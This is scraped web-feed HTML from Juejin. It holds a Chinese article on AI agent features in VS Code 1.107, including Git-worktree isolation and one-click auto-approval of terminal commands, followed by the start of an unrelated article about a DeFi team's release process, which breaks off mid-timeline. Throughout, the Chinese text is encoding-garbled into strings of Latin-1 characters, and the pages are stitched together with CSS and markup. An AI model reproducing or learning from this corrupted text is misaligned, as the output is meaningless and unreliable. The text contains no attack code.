pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<h2 data-id="heading-0">ğŸš€ ä¸€å¥è¯æ€»ç»“</h2>
<blockquote>
<p><strong>VS Code 1.107 å½»åº•é‡æ„äº† AI äº¤äº’æ¨¡å‹ï¼šä»ã€Œé—®ä¸€å¥ç­”ä¸€å¥ã€çš„ Chat ç•Œé¢ï¼Œå‡çº§ä¸ºã€Œé¢„æµ‹å¼åä½œè€…ã€â€”â€”å®ƒæå‰ 3 æ­¥çŒœä½ æƒ³å†™ä»€ä¹ˆï¼Œå¹¶åœ¨ä½ æ•²ä¸‹å›è½¦å‰ï¼ŒæŠŠä»£ç ã€æ–‡æ¡£ã€æµ‹è¯•å…¨é“ºå¥½ã€‚</strong></p>
</blockquote>
<p><strong>ä½ çš„ IDEï¼Œç»ˆäºå­¦ä¼šã€Œä¸»åŠ¨å¹²æ´»ã€äº†ã€‚</strong></p>
<hr/>
<h2 data-id="heading-1">ğŸ–¼ï¸æ•´åˆä»£ç†ä¼šè¯å’ŒèŠå¤©</h2>
<p>æ–°ç‰ˆæœ¬å°†ä»£ç†ä¼šè¯é›†æˆåˆ°äº†èŠå¤©è§†å›¾ä¸­ï¼Œä¸ºæ‚¨åœ¨ä½¿ç”¨ä»£ç†æ—¶æä¾›ç»Ÿä¸€çš„ä½“éªŒã€‚æ‚¨å¯ä»¥ä¸€ç›®äº†ç„¶åœ°æŸ¥çœ‹ä¼šè¯çš„çŠ¶æ€ã€è¿›åº¦ä»¥åŠæ–‡ä»¶æ›´æ”¹ç»Ÿè®¡ä¿¡æ¯ã€‚æ‚¨è¿˜å¯ä»¥å¯¹ä¼šè¯è¿›è¡Œå½’æ¡£æˆ–å–æ¶ˆå½’æ¡£ï¼Œä»¥ä¾¿ä¿æŒä¼šè¯åˆ—è¡¨çš„æ•´æ´æœ‰åº
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86a9e40f60e64993827b754e8a8af8cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=B0JpwXWMkbpoBGDxcFXYB%2Bx5FtE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å½“ä½ ä»åˆ—è¡¨ä¸­é€‰ä¸­ä¸€ä¸ªä¼šè¯æ—¶ï¼Œå®ƒä¼šåœ¨ä¾§è¾¹æ çš„èŠå¤©è§†å›¾ä¸­æ‰“å¼€è¯¥ä¼šè¯ï¼Œæ–¹ä¾¿æ‚¨æŸ¥çœ‹å®Œæ•´çš„å¯¹è¯å†å²è®°å½•ã€‚å¦‚æœæ‚¨æ„¿æ„ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å°†æŸä¸ªä¼šè¯ä½œä¸ºç¼–è¾‘å™¨æ ‡ç­¾é¡µæˆ–åœ¨æ–°çª—å£ä¸­æ‰“å¼€ã€‚å³é”®ç‚¹å‡»ä¼šè¯å³å¯çœ‹åˆ°åŒ…å«è¿™äº›é€‰é¡¹çš„ä¸Šä¸‹æ–‡èœå•ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d459d7e16134ebd8e9b774a86fbf479~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=Pa%2FiUvUdCL1InebqY2az%2BoEktns%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
é»˜è®¤æƒ…å†µä¸‹ï¼Œå†èŠå¤©çª—å£ä¼šæ˜¾ç¤ºæœ€è¿‘çš„3ä¸ªä¼šè¯
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e96e048d456405fb778b2bcca72d274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=%2BzpRZSGz6e2gAajS2lO6PU7481w%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
é€‰æ‹©â€œShow All Sessionsâ€å³å¯æŸ¥çœ‹å®Œæ•´çš„ä¼šè¯åˆ—è¡¨ï¼Œå¹¶æä¾›æœç´¢ä¸ç­›é€‰é€‰é¡¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81b6ec63262642fd83389d2564db036e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=0deXDaa7fWWGeTLzR%2BzsQwc11mM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
å¹¶æ’è§†å›¾</p>
<p>å½“èŠå¤©è§†å›¾è¶³å¤Ÿå®½æ—¶ï¼ˆä¾‹å¦‚ï¼Œå½“æ‚¨å°†å…¶æœ€å¤§åŒ–æ—¶ï¼‰ï¼Œä¼šè¯åˆ—è¡¨ä¼šè‡ªåŠ¨ä»¥å¹¶æ’æ–¹å¼ä¸èŠå¤©è§†å›¾ä¸€èµ·æ˜¾ç¤ºã€‚è¿™ç§è§†å›¾è®©æ‚¨å¯ä»¥åœ¨ä¸ä¸¢å¤±ä¸Šä¸‹æ–‡çš„æƒ…å†µä¸‹å¿«é€Ÿåœ¨ä¸åŒä¼šè¯ä¹‹é—´åˆ‡æ¢ã€‚æ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ç›¸åº”çš„æ§åˆ¶æŒ‰é’®æ‰‹åŠ¨åˆ‡æ¢è¿™ç§å¹¶æ’è§†å›¾ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df5765a1de4a40618df19434f9540aaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=Y7k10Gj5ThFQdbmNmZTyLRNOgrk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-2">ğŸ” ä½¿ç”¨ Git å·¥ä½œæ ‘éš”ç¦»åå°ä»£ç†</h2>
<p>åå°ä»£ç†æ—¨åœ¨åå°è‡ªä¸»è¿è¡Œï¼Œè®©æ‚¨å¯ä»¥åˆ†æµä»»åŠ¡ï¼Œä»è€Œä¸“æ³¨äºå…¶ä»–å·¥ä½œã€‚å¦‚æœå¤šä¸ªåå°ä»£ç†åŒæ—¶ä¿®æ”¹å·¥ä½œåŒºä¸­çš„åŒä¸€æ–‡ä»¶ï¼Œå¯èƒ½ä¼šå¼•å‘å†²çªã€‚</p>
<p>åœ¨æ–°ç‰ˆæœ¬ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡å¼•å…¥å¯¹ Git å·¥ä½œæ ‘çš„æ”¯æŒï¼Œå¢å¼ºäº†åå°ä»£ç†çš„éš”ç¦»æ€§ã€‚å½“æ‚¨åˆ›å»ºä¸€ä¸ªæ–°çš„åå°ä»£ç†æ—¶ï¼Œå¯ä»¥é€‰æ‹©åœ¨å½“å‰å·¥ä½œåŒºä¸­è¿è¡Œï¼Œæˆ–åœ¨ä¸“ç”¨çš„ Git å·¥ä½œæ ‘ä¸­è¿è¡Œã€‚è®©åå°ä»»åŠ¡çš„æ‰§è¡Œæ›´å®‰å…¨ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/202bed9a1aa04f87b58151554d1f24a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=8rSDFFE%2B22ZzxhhUvg6fzxOh5p0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
å½“ä½ åœ¨ Git å·¥ä½œæ ‘ä¸­è¿è¡Œåå°ä»£ç†æ—¶ï¼Œä»£ç†ä¼šä¸ºè¯¥ä¼šè¯è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæ–°çš„ Git å·¥ä½œæ ‘ï¼Œå°†å…¶å˜æ›´éš”ç¦»åˆ°å•ç‹¬çš„æ–‡ä»¶å¤¹ä¸­ã€‚è¿™æ ·ï¼Œæ‚¨å°±å¯ä»¥åŒæ—¶è¿è¡Œå¤šä¸ªåå°ä»£ç†è€Œä¸ä¼šäº§ç”Ÿå†²çªã€‚</p>
<p>åœ¨åå°ä»£ç†å®Œæˆä»»åŠ¡åï¼Œæ‚¨å¯ä»¥è½»æ¾åœ°å°†å·¥ä½œæ ‘ä¸­æ‰€åšçš„å˜æ›´å®¡æŸ¥å¹¶åˆå¹¶å›ä¸»å·¥ä½œåŒºã€‚æˆ‘ä»¬è¿˜æ–°å¢äº†ä¸€ä¸ªæ“ä½œï¼Œå¯ç›´æ¥å°†å·¥ä½œæ ‘ä¸­çš„å˜æ›´åº”ç”¨åˆ°æ‚¨çš„å·¥ä½œåŒºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8edf7b398a084e1790823453a14233cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=9pMNWC7CGS1u9%2Bin1u2aoO0SUoo%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
åå°ä»£ç†ç°åœ¨æ”¯æŒå¤šç§ä¸Šä¸‹æ–‡é™„åŠ ç±»å‹ã€‚æ‚¨å¯ä»¥å°†é€‰åŒºã€é—®é¢˜ã€ç¬¦å·ã€æœç´¢ç»“æœã€Git æäº¤ç­‰å†…å®¹é™„åŠ åˆ°ä»»æ„æç¤ºä¸­ã€‚è¿™ä½¿å¾—æ„å»ºæ›´ä¸°å¯Œã€æ›´ç²¾å‡†çš„æç¤ºæˆä¸ºå¯èƒ½ï¼Œä»è€Œè§£é”æ›´å¤æ‚ã€æ›´çµæ´»çš„å·¥ä½œæµã€‚ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥é™„åŠ ä¸€ä¸ªå·²æŠ¥å‘Šçš„é—®é¢˜ï¼Œå¹¶è®©ä»£ç†ç›´æ¥ä¿®å¤å®ƒï¼Œè€Œæ— éœ€æ‰‹åŠ¨æŒ‡å®šæ–‡ä»¶è·¯å¾„å’Œè¡Œå·ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bc651fb3ca441619f3606b1a6f6fc3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=jaxO%2FeXVjJ4Th2VXMkRg09feNLM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-3">2ï¸âƒ£ ğŸ› ï¸å†…è”èŠå¤©UI</h3>
<p>ç°åœ¨ï¼Œå†…è”èŠå¤©å·²é’ˆå¯¹å½“å‰æ–‡ä»¶å†…çš„ä»£ç ä¿®æ”¹è¿›è¡Œäº†ä¼˜åŒ–ã€‚å¯¹äºå†…è”èŠå¤©æ— æ³•å¤„ç†çš„ä»»åŠ¡ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨å‡çº§åˆ°èŠå¤©è§†å›¾ï¼ˆChat viewï¼‰ï¼Œæ‚¨çš„æç¤ºä¼šè¢«é‡æ–°æ’­æ”¾ï¼Œå¹¶ä½¿ç”¨ç›¸åŒçš„æ¨¡å‹å’Œç›¸åŒçš„ä¸Šä¸‹æ–‡ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/452b9bbdd3ba4f75960ed70df664124c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=bSEcinzlRnOgTjm7sDAfYsD9DgM%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13e0d13da7b44871a77fabf3fadc5782~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=K6uPOcwIMoHvhTXUlCsYBCLMgik%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-4">3ï¸âƒ£ ğŸ§ª ä¸€é”®å…è®¸ç»ˆç«¯æ‰€æœ‰å‘½ä»¤</h3>
<p>ç»ˆç«¯å·¥å…·æ–°å¢äº†è‡ªåŠ¨æ‰¹å‡†é€‰é¡¹ï¼Œå¯å…è®¸ä¼šè¯ä¸­æ‰€æœ‰æœªæ¥çš„å‘½ä»¤æ— éœ€é€ä¸€ç¡®è®¤ã€‚å½“æ‚¨å¼€å¯æ–°ä¼šè¯æ—¶ï¼Œç»ˆç«¯å‘½ä»¤ä»ä¼šéµå¾ªç°æœ‰çš„æ‰¹å‡†é…ç½®ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d0a3f9ebc83645febebf539213c33a41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=pQrJ66EuKX1rcqL5VT9XWjWwVpE%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-5">3ï¸âƒ£ ğŸ§ª è‡ªå®šä¹‰Agentå¯ç»‘å®šå¿«æ·é”®</h3>
<p>æ¯ä¸ªè‡ªå®šä¹‰ä»£ç†ç°åœ¨åœ¨å‘½ä»¤åˆ—è¡¨ä¸­éƒ½æœ‰å„è‡ªç‹¬ç«‹çš„æ“ä½œé¡¹ï¼Œæ‚¨è¿˜å¯ä»¥ä¸ºæ¯ä¸ªæ“ä½œå•ç‹¬ç»‘å®šé”®ç›˜å¿«æ·é”®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å®šä¹‰äº†ä¸€ä¸ªåä¸ºâ€œCode Reviewerâ€çš„è‡ªå®šä¹‰ä»£ç†ï¼Œå‘½ä»¤é¢æ¿ä¸­å°±ä¼šå‡ºç° Chat: æ‰“å¼€èŠå¤©ï¼ˆCode Reviewerä»£ç†ï¼‰ è¿™ä¸€å‘½ä»¤ï¼Œä¾›æ‚¨ä¸ºå…¶ç»‘å®šé”®ç›˜å¿«æ·é”®ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a76e01ea2034b96b0ed5b59fc9096ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ29sYW5n5a2m5Lmg6K6w:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767833649&amp;x-signature=%2BIAVCBaGfFiL5qmUYLtxh7zP%2FXg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-6">ğŸ’­ æœ€åè¯´ä¸¤å¥</h2>
<blockquote>
<p><em>â€œå·¥å…·çš„ç»ˆæç›®æ ‡ï¼Œä¸æ˜¯å–ä»£äººï¼Œè€Œæ˜¯è®©äººå›å½’åˆ›é€ æ€§æœ¬èº«ã€‚â€</em></p>
</blockquote>
<p>VS Code 1.107 çš„ AI ä¸æ˜¯é­”æ³•â€”â€”<br/>
å®ƒæ˜¯<strong>åå¹´å·¥ç¨‹æ²‰æ·€ + å¯¹å¼€å‘è€…å·¥ä½œæµçš„æ·±åˆ»ç†è§£</strong>çš„ç»“æ™¶ã€‚</p>
<p>å½“è¡¥å…¨ä¸å†æ‰“æ–­å¿ƒæµï¼Œå½“é”™è¯¯å˜æˆæ•™å­¦æ—¶åˆ»ï¼Œå½“ PR Review ä»è´Ÿæ‹…å˜æˆå¯¹è¯â€”â€”<br/>
<strong>æˆ‘ä»¬ç¦»ã€Œç¼–ç¨‹å³æ€è€ƒã€çš„åˆå¿ƒï¼Œåˆè¿‘äº†ä¸€æ­¥ã€‚</strong></p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä» 3 å°æ—¶åˆ° 15 åˆ†é’Ÿï¼šæˆ‘ä»¬çš„å‘å¸ƒæ•ˆç‡æå‡ 10 å€ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7589940913766858787</link>    <guid>https://juejin.cn/post/7589940913766858787</guid>    <pubDate>2026-01-01T08:39:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940913766858787" data-draft-id="7589930672833282083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä» 3 å°æ—¶åˆ° 15 åˆ†é’Ÿï¼šæˆ‘ä»¬çš„å‘å¸ƒæ•ˆç‡æå‡ 10 å€ä¹‹è·¯"/> <meta itemprop="keywords" content="è‡ªåŠ¨åŒ–è¿ç»´"/> <meta itemprop="datePublished" content="2026-01-01T08:39:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="draking"/> <meta itemprop="url" content="https://juejin.cn/user/1065861228790043"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä» 3 å°æ—¶åˆ° 15 åˆ†é’Ÿï¼šæˆ‘ä»¬çš„å‘å¸ƒæ•ˆç‡æå‡ 10 å€ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1065861228790043/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    draking
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:39:28.000Z" title="Thu Jan 01 2026 08:39:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä¸€ä¸ª DeFi å›¢é˜Ÿå¦‚ä½•é€šè¿‡æµç¨‹ä¼˜åŒ–ï¼ŒæŠŠå‘å¸ƒæ—¶é—´ä»åŠå¤©å‹ç¼©åˆ°ä¸€æ¯å’–å•¡çš„æ—¶é—´</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">é‚£ä¸ªè®©æˆ‘å´©æºƒçš„å‘¨äº”ä¸‹åˆ</h2>
<p>æ•…äº‹è¦ä»ä¸‰ä¸ªæœˆå‰è¯´èµ·ã€‚</p>
<p>é‚£æ˜¯ä¸€ä¸ªå‘¨äº”ä¸‹åˆï¼Œæˆ‘ä»¬è¦å‘å¸ƒè´¨æŠ¼ç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ã€‚ä½œä¸ºå›¢é˜Ÿé‡Œå”¯ä¸€æ‡‚éƒ¨ç½²çš„äººï¼Œæˆ‘ä¿¡å¿ƒæ»¡æ»¡åœ°å¼€å§‹äº†å‘å¸ƒæµç¨‹ã€‚</p>
<p><strong>14:00</strong> - å¼€å§‹éƒ¨ç½²åˆçº¦åˆ° Polygon æµ‹è¯•ç½‘
<strong>14:30</strong> - åˆçº¦éƒ¨ç½²æˆåŠŸï¼Œå¼€å§‹æ›´æ–°å‰ç«¯é…ç½®
<strong>14:45</strong> - å‘ç°é…ç½®æ–‡ä»¶æ ¼å¼å†™é”™äº†ï¼Œé‡æ–°ä¿®æ”¹
<strong>15:00</strong> - å‰ç«¯æ‰“åŒ…å®Œæˆï¼Œå¼€å§‹éƒ¨ç½²
<strong>15:20</strong> - éƒ¨ç½²æˆåŠŸï¼Œä½†å‘ç°åˆçº¦åœ°å€é…é”™äº†
<strong>15:40</strong> - é‡æ–°æ‰“åŒ…ï¼Œé‡æ–°éƒ¨ç½²
